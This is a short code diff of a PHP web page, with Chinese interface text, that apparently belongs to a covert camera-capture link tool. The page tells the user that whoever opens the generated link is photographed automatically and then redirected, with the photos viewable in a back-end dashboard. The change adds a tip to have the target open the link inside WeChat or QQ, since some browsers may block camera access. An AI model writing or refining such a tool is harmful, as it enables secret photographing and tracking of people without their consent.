@@ -1054,7 +1054,8 @@ body {
             ID: <code><?php echo htmlspecialchars($generated_id); ?></code>
             <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.3);color:#667eea;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
             — 用此ID可在后台查看照片<br>
-            对方打开链接后会自动拍摄一张照片并跳转到指定页面
+            对方打开链接后会自动拍摄一张照片并跳转到指定页面<br>
+            <span style="color:#ff9800;font-size:12px;">💡 建议让对方在微信或QQ内打开链接，部分浏览器可能无法获取摄像头权限</span>
             <?php if (isLoggedIn()): ?>
                 <br><a href="dashboard.php" style="color:#667eea;">👉 前往后台管理</a>
             <?php endif; ?>
